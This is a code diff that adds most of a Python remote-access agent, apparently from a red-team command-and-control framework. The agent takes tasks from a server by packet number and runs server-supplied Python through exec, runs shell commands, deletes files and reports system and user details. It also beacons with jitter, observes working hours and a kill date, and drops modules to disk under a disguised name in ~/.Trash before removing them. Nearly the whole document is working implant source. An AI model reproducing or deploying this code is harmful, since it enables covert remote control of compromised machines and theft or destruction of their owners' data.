+    def job_list(self, resultID):
+        """
+        Return a list of all running agent.jobs.
+        Task 50
+        """
+        msg = "Active agent.jobs:\n"
+
+        for key in self.jobs:
+            msg += "Task %s" % key
+        self.packet_handler.send_message(self.packet_handler.build_response_packet(50, msg, resultID))
+
+    def stop_job(self, jobID, resultID):
+        """
+        Stop a running job.
+        Task 51
+        """
+        try:
+            self.jobs[int(jobID)].kill()
+            self.jobs.pop(int(jobID))
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    51, "[+] Job thread %s stopped successfully" % (jobID), resultID
+                )
+            )
+        except Exception as e:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    51, "[!] Error stopping job thread: %s" % (e), resultID
+                )
+            )
+
+
+    def start_smb_pipe_server(self, data, resultID):
+        """
+        Start an SMB pipe server on the target.
+        Task 70
+        """
+        self.packet_handler.send_message(
+            self.packet_handler.build_response_packet(70, "[!] SMB server not support in Python agent", resultID)
+        )
+
+    def dynamic_code_execute_wait_nosave(self, data, resultID):
+        """
+        Execute dynamic code and wait for the results without saving output.
+        Task 100
+        """
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(data, "<string>", "exec")
+            exec(code_obj, globals())
+            sys.stdout = sys.__stdout__
+            results = buffer.getvalue()
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(results), resultID))
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            return self.packet_handler.build_response_packet(
+                0,
+                "error executing specified Python data: %s \nBuffer data recovered:\n%s"
+                % (e, errorData),
+                resultID,
+            )
+
+    def dynamic_code_execution_wait_save(self, data, resultID):
+        """
+        Execute dynamic code and wait for the results while saving output.
+        Task 101
+        """
+        prefix = data[0:15].strip()
+        extension = data[15:20].strip()
+        data = data[20:]
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(data, "<string>", "exec")
+            exec(code_obj, globals())
+            sys.stdout = sys.__stdout__
+            results = buffer.getvalue().encode("latin-1")
+            c = compress()
+            start_crc32 = c.crc32_data(results)
+            comp_data = c.comp_data(results)
+            encodedPart = c.build_header(comp_data, start_crc32)
+            encodedPart = base64.b64encode(encodedPart).decode("UTF-8")
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    101,
+                    "{0: <15}".format(prefix)
+                    + "{0: <5}".format(extension)
+                    + encodedPart,
+                    resultID,
+                )
+            )
+        except Exception as e:
+            # Also return partial code that has been executed
+            errorData = buffer.getvalue()
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0,
+                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    % (e, errorData),
+                    resultID,
+                )
+            )
+
+    def disk_code_execution_wait_save(self, data, resultID):
+        """
+        Execute on disk code and wait for the results while saving output.
+        For modules that require multiprocessing not supported by exec
+        Task 110
+        """
+        # todo: is this used?
+        try:
+            implantHome = expanduser("~") + "/.Trash/"
+            moduleName = ".mac-debug-data"
+            implantPath = implantHome + moduleName
+            result = "[*] Module disk path: %s \n" % (implantPath)
+            with open(implantPath, "w") as f:
+                f.write(data)
+            result += "[*] Module properly dropped to disk \n"
+            pythonCommand = "python %s" % (implantPath)
+            process = subprocess.Popen(
+                pythonCommand, stdout=subprocess.PIPE, shell=True
+            )
+            data = process.communicate()
+            result += data[0].strip()
+            try:
+                os.remove(implantPath)
+                result += "[*] Module path was properly removed: %s" % (implantPath)
+            except Exception as e:
+                print("error removing module filed: %s" % (e))
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                result += "\n\nError removing module file, please verify path: " + str(
+                    implantPath
+                )
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(100, str(result), resultID))
+        except Exception as e:
+            fileCheck = os.path.isfile(implantPath)
+            if fileCheck:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        0,
+                        "error executing specified Python data: %s \nError removing module file, please verify path: %s"
+                        % (e, implantPath),
+                        resultID,
+                    )
+                )
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "error executing specified Python data: %s" % (e), resultID
+                )
+            )
+
+    def powershell_task(self, data, resultID):
+        """
+        Execute a PowerShell command.
+        Task 112
+        """
+        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", resultID)
+        self.packet_handler.process_job_tasking(result_packet)
+
+    def powershell_task_dyanmic_code_wait_nosave(self, data, resultID):
+        """
+        Execute a PowerShell command and wait for the results without saving output.
+        Task 118
+        """
+        result_packet = self.packet_handler.build_response_packet(110, "[!] PowerShell tasks not implemented", resultID)
+        self.packet_handler.process_job_tasking(result_packet)
+
+    def script_command(self, data, resultID):
+        """
+        Execute a base64 encoded script.
+        Task 121
+        """
+        script = base64.b64decode(data)
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(script, "<string>", "exec")
+            exec(code_obj, globals())
+            sys.stdout = sys.__stdout__
+            result = str(buffer.getvalue())
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(121, result, resultID))
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0,
+                    "error executing specified Python data %s \nBuffer data recovered:\n%s"
+                    % (e, errorData),
+                    resultID,
+                )
+            )
+
+    def script_load(self, data, resultID):
+        """
+        Load a script into memory.
+        Task 122
+        """
+        try:
+            parts = data.split("|")
+            base64part = parts[1]
+            fileName = parts[0]
+            raw = base64.b64decode(base64part)
+            d = decompress()
+            dec_data = d.dec_data(raw, cheader=True)
+            if not dec_data["crc32_check"]:
+                self.packet_handler.send_message(
+                    self.packet_handler.build_response_packet(
+                        122, "Failed crc32_check during decompression", resultID
+                    )
+                )
+        except Exception as e:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    122, "Unable to decompress zip file: %s" % (e), resultID
+                )
+            )
+
+        zdata = dec_data["data"]
+        zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
+        if fileName in list(moduleRepo.keys()):
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    122, "%s module already exists" % (fileName), resultID
+                )
+            )
+        else:
+            moduleRepo[fileName] = zf
+            self.install_hook(fileName)
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    122, "Successfully imported %s" % (fileName), resultID
+                )
+            )
+
+    def view_loaded_modules(self, data, resultID):
+        """
+        View loaded modules.
+        Task 123
+        """
+        # view loaded modules
+        repoName = data
+        if repoName == "":
+            loadedModules = "\nAll Repos\n"
+            for key, value in list(moduleRepo.items()):
+                loadedModules += "\n----" + key + "----\n"
+                loadedModules += "\n".join(moduleRepo[key].namelist())
+
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+        else:
+            try:
+                loadedModules = "\n----" + repoName + "----\n"
+                loadedModules += "\n".join(moduleRepo[repoName].namelist())
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, loadedModules, resultID))
+            except Exception as e:
+                msg = "Unable to retrieve repo contents: %s" % (str(e))
+                self.packet_handler.send_message(self.packet_handler.build_response_packet(123, msg, resultID))
+
+    def remove_module(self, data, resultID):
+        """
+        Remove a module.
+        """
+        repoName = data
+        try:
+            self.remove_hook(repoName)
+            del moduleRepo[repoName]
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    124, "Successfully remove repo: %s" % (repoName), resultID
+                )
+            )
+        except Exception as e:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID
+                )
+            )
+
+    def start_job(self, code, resultID):
+        # create a new code block with a defined method name
+        codeBlock = "def method():\n" + indent(code[1:])
+
+        # register the code block
+        code_obj = compile(codeBlock, "<string>", "exec")
+        # code needs to be in the global listing
+        # not the locals() scope
+        exec(code_obj, globals())
+
+        # create/process Packet start/return the thread
+        # call the job_func so sys data can be captured
+        codeThread = KThread(target=self.job_func, args=(resultID,))
+        codeThread.start()
+
+        self.jobs[resultID] = codeThread
+
+    def job_func(self, resultID):
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            # now call the function required
+            # and capture the output via sys
+            method()
+            sys.stdout = sys.__stdout__
+            dataStats_2 = buffer.getvalue()
+            result = self.packet_handler.build_response_packet(110, str(dataStats_2), resultID)
+            self.packet_handler.process_job_tasking(result)
+        except Exception as e:
+            p = "error executing specified Python job data: " + str(e)
+            result = self.packet_handler.build_response_packet(0, p, resultID)
+            self.packet_handler.process_job_tasking(result)
+
+    def job_message_buffer(self, message):
+        # Supports job messages for checkin
+        try:
+            self.jobMessageBuffer += str(message)
+        except Exception as e:
+            print(e)
+
+    def get_job_message_buffer(self):
+        try:
+            result = self.packet_handler.build_response_packet(110, str(self.jobMessageBuffer))
+            self.jobMessageBuffer = ""
+            return result
+        except Exception as e:
+            return self.packet_handler.build_response_packet(0, "[!] Error getting job output: %s" % (e))
+
+    def start_webserver(self, data, ip, port, serveCount):
+        # thread data_webserver for execution
+        t = threading.Thread(target=self.data_webserver, args=(data, ip, port, serveCount))
+        t.start()
+        return
+
+    def data_webserver(self, data, ip, port, serveCount):
+        # hosts a file on port and IP servers data string
+        hostName = str(ip)
+        portNumber = int(port)
+        data = str(data)
+        serveCount = int(serveCount)
+        count = 0
+
+        class serverHandler(http.server.BaseHTTPRequestHandler):
+            def do_GET(s):
+                """Respond to a GET request."""
+                s.send_response(200)
+                s.send_header("Content-type", "text/html")
+                s.end_headers()
+                s.wfile.write(data)
+
+            def log_message(s, format, *args):
+                return
+
+        server_class = http.server.HTTPServer
+        httpServer = server_class((hostName, portNumber), serverHandler)
+        try:
+            while count < serveCount:
+                httpServer.handle_request()
+                count += 1
+        except:
+            pass
+        httpServer.server_close()
+        return
+
+    def permissions_to_unix_name(self, st_mode):
+        permstr = ""
+        usertypes = ["USR", "GRP", "OTH"]
+        for usertype in usertypes:
+            perm_types = ["R", "W", "X"]
+            for permtype in perm_types:
+                perm = getattr(stat, "S_I%s%s" % (permtype, usertype))
+                if st_mode & perm:
+                    permstr += permtype.lower()
+                else:
+                    permstr += "-"
+        return permstr
+
+    def directory_listing(self, path):
+        # directory listings in python
+        # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
+
+        res = ""
+        for fn in os.listdir(path):
+            fstat = os.stat(os.path.join(path, fn))
+            permstr = self.permissions_to_unix_name(fstat[0])
+
+            if os.path.isdir(fn):
+                permstr = "d{}".format(permstr)
+            else:
+                permstr = "-{}".format(permstr)
+
+            user = pwd.getpwuid(fstat.st_uid)[0]
+            group = grp.getgrgid(fstat.st_gid)[0]
+
+            # Convert file size to MB, KB or Bytes
+            fsize = fstat.st_size
+            unit = "B"
+
+            if fsize > 1024:
+                fsize >>= 10
+                unit = "KB"
+
+            if fsize > 1024:
+                fsize >>= 10
+                unit = "MB"
+
+            mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
+
+            res += "{} {} {} {:18s} {:f} {:2s} {:15.15s}\n".format(
+                permstr, user, group, mtime, fsize, unit, fn
+            )
+
+        return res
+
+    # additional implementation methods
+    def run_command(self, command, cmdargs=None):
+        if command == "shell":
+            if cmdargs is None:
+                return "no shell command supplied"
+
+            p = subprocess.Popen(
+                cmdargs,
+                stdin=None,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                shell=True,
+            )
+            return p.communicate()[0].strip().decode("UTF-8")
+        elif re.compile("(ls|dir)").match(command):
+            if cmdargs == None or not os.path.exists(cmdargs):
+                cmdargs = "."
+
+            return self.directory_listing(cmdargs)
+        elif re.compile("cd").match(command):
+            os.chdir(cmdargs)
+            return str(os.getcwd())
+        elif re.compile("pwd").match(command):
+            return str(os.getcwd())
+        elif re.compile("rm").match(command):
+            if cmdargs is None:
+                return "please provide a file or directory"
+
+            if os.path.exists(cmdargs):
+                if os.path.isfile(cmdargs):
+                    os.remove(cmdargs)
+                    return "done."
+                elif os.path.isdir(cmdargs):
+                    shutil.rmtree(cmdargs)
+                    return "done."
+                else:
+                    return "unsupported file type"
+            else:
+                return "specified file/directory does not exist"
+        elif re.compile("mkdir").match(command):
+            if cmdargs is None:
+                return "please provide a directory"
+
+            os.mkdir(cmdargs)
+            return "Created directory: {}".format(cmdargs)
+
+        elif re.compile("(whoami|getuid)").match(command):
+            return pwd.getpwuid(os.getuid())[0]
+
+        elif re.compile("hostname").match(command):
+            return str(socket.gethostname())
+
+        else:
+            if cmdargs is not None:
+                command = "{} {}".format(command, cmdargs)
+
+            p = subprocess.Popen(
+                command,
+                stdin=None,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                shell=True,
+            )
+            return p.communicate()[0].strip().decode("UTF-8")
+
+    def get_file_part(self, filePath, offset=0, chunkSize=512000, base64=True):
+        if not os.path.exists(filePath):
+            return ""
+
+        f = open(filePath, "rb")
+        f.seek(offset, 0)
+        data = f.read(chunkSize)
+        f.close()
+        if base64:
+            return base64.b64encode(data)
+        else:
+            return data
+
+    def get_sysinfo(self, server, nonce='00000000'):
+        # NOTE: requires global variable "server" to be set
+
+        # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version | architecture
+        __FAILED_FUNCTION = '[FAILED QUERY]'
+
+        try:
+            username = pwd.getpwuid(os.getuid())[0].strip("\\")
+        except Exception as e:
+            username = __FAILED_FUNCTION
+        try:
+            uid = os.popen('id -u').read().strip()
+        except Exception as e:
+            uid = __FAILED_FUNCTION
+        try:
+            highIntegrity = "True" if (uid == "0") else False
+        except Exception as e:
+            highIntegrity = __FAILED_FUNCTION
+        try:
+            osDetails = os.uname()
+        except:
+            osDetails = __FAILED_FUNCTION
+        try:
+            processID = os.getpid()
+        except Exception as e:
+            processID = __FAILED_FUNCTION
+        try:
+            hostname = osDetails[1]
+        except Exception as e:
+            hostname = __FAILED_FUNCTION
+        try:
+            internalIP = socket.gethostbyname(socket.gethostname())
+        except Exception as e:
+            try:
+                internalIP = os.popen("ifconfig|grep inet|grep inet6 -v|grep -v 127.0.0.1|cut -d' ' -f2").read()
+            except Exception as e1:
+                internalIP = __FAILED_FUNCTION
+        try:
+            osDetails = ",".join(osDetails)
+        except Exception as e:
+            osDetails = __FAILED_FUNCTION
+        try:
+            temp = sys.version_info
+            pyVersion = "%s.%s" % (temp[0], temp[1])
+        except Exception as e:
+            pyVersion = __FAILED_FUNCTION
+        try:
+            architecture = platform.machine()
+        except Exception as e:
+            architecture = __FAILED_FUNCTION
+
+        language = 'python'
+        cmd = 'ps %s' % (os.getpid())
+        ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        out, err = ps.communicate()
+        parts = out.split(b"\n")
+        if len(parts) > 2:
+            processName = b" ".join(parts[1].split()[4:]).decode('UTF-8')
+        else:
+            processName = 'python'
+        return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (
+        nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language,
+        pyVersion, architecture)
+
+    def process_packet(self, packetType, data, resultID):
+        try:
+            packetType = int(packetType)
+        except Exception as e:
+            return None
+
+        if packetType == 1:
+            # sysinfo request
+            # get_sysinfo should be exposed from stager.py
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(1, self.get_sysinfo(server=self.server), resultID))
+
+        elif packetType == 2:
+            # agent exit
+            self.packet_handler.send_message(self.packet_handler.build_response_packet(2, "", resultID))
+            self.agent_exit()
+
+        elif packetType == 34:
+            # TASK_SET_PROXY
+            pass
+
+        elif packetType == 40:
+            self.run_prebuilt_command(data, resultID)
+
+        elif packetType == 41:
+            self.file_download(data, resultID)
+
+        elif packetType == 42:
+            self.file_upload(data, resultID)
+
+        elif packetType == 43:
+            self.directory_list(data, resultID)
+
+        elif packetType == 44:
+            self.csharp_execute(data, resultID)
+
+        elif packetType == 50:
+            self.job_list(resultID)
+
+        elif packetType == 51:
+            self.stop_job(data, resultID)
+
+        elif packetType == 60:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "[!] SOCKS Server not implemented", resultID
+                )
+            )
+
+        elif packetType == 61:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "[!] SOCKS Server not implemented", resultID
+                )
+            )
+
+        elif packetType == 70:
+            self.start_smb_pipe_server(data, resultID)
+
+        elif packetType == 100:
+            self.dynamic_code_execute_wait_nosave(data, resultID)
+
+        elif packetType == 101:
+            self.dynamic_code_execution_wait_save(data, resultID)
+
+        elif packetType == 102:
+            self.disk_code_execution_wait_save(data, resultID)
+
+        elif packetType == 110:
+            self.start_job(data, resultID)
+
+        elif packetType == 111:
+            # TASK_CMD_JOB_SAVE
+            pass
+
+        elif packetType == 112:
+            self.powershell_task(data, resultID)
+
+        elif packetType == 118:
+            self.powershell_task_dyanmic_code_wait_nosave(data, resultID)
+
+        elif packetType == 119:
+            pass
+
+        elif packetType == 121:
+            self.script_command(data, resultID)
+
+        elif packetType == 122:
+            self.script_load(data, resultID)
+
+        elif packetType == 123:
+            self.view_loaded_modules(data, resultID)
+
+        elif packetType == 124:
+            self.remove_module(data, resultID)
+
+        elif packetType == 130:
+            # Dynamically update agent comms
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "[!] Switch agent comms not implemented", resultID
+                )
+            )
+
+        elif packetType == 131:
+            # Update the listener name variable
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(
+                    0, "[!] Switch agent comms not implemented", resultID
+                )
+            )
+
+        else:
+            self.packet_handler.send_message(
+                self.packet_handler.build_response_packet(0, "invalid tasking ID: %s" % (packetType), resultID)
+            )
+
+    def run(self):
+        while True:
+            try:
+                if self.working_hours and "WORKINGHOURS" not in self.working_hours:
+                    try:
+                        start, end = self.working_hours.split("-")
+                        now = datetime.datetime.now()
+                        startTime = datetime.datetime.strptime(start, "%H:%M")
+                        endTime = datetime.datetime.strptime(end, "%H:%M")
+
+                        if not (startTime <= now <= endTime):
+                            sleepTime = startTime - now
+                            time.sleep(sleepTime.seconds)
+
+                    except Exception as e:
+                        pass
+
+                if self.kill_date and "KILLDATE" not in self.kill_date:
+                    now = datetime.datetime.now().date()
+                    try:
+                        kill_date_time = datetime.datetime.strptime(self.kill_date, "%m/%d/%Y").date()
+                    except:
+                        pass
+
+                    if now >= kill_date_time:
+                        msg = "[!] Agent %s exiting" % (self.sessionID)
+                        self.packet_handler.send_message(self.packet_handler.build_response_packet(2, msg))
+                        self.agent_exit()
+
+                if self.packet_handler.missedCheckins >= self.lostLimit:
+                    self.agent_exit()
+
+                if self.jitter < 0:
+                    self.jitter = -self.jitter
+                if self.jitter > 1:
+                    self.jitter = 1 / self.jitter
+
+                minSleep = int((1.0 - self.jitter) * self.delay)
+                maxSleep = int((1.0 + self.jitter) * self.delay)
+
+                sleepTime = random.randint(minSleep, maxSleep)
+                time.sleep(sleepTime)
+
+                code, data = self.packet_handler.send_message()
+
+                if code == "200":
+                    try:
+                        self.send_job_message_buffer()
+                    except Exception as e:
+                        result = self.packet_handler.build_response_packet(
+                            0, str("[!] Failed to check job buffer!: " + str(e))
+                        )
+                        self.packet_handler.process_job_tasking(result)
+
+                    if data.strip() == self.defaultResponse.strip() or data == base64.b64encode(self.defaultResponse):
+                        self.packet_handler.missedCheckins = 0
+                    else:
+                        self.packet_handler.decode_routing_packet(data)
+                else:
+                    pass
+
+            except Exception as e:
+                print("main() exception: %s" % (e))
+                traceback.print_exc()
